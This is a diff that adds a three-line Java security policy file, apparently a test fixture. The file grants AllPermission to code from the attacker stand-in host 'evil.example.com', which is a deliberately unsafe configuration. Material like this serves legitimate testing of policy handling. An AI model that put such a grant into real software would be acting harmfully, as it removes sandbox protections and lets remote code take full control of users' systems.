@@ -1,0 +1,3 @@
+grant codeBase "http://evil.example.com/-", signedBy "a", principal * * {
+  permission java.security.AllPermission;
+};
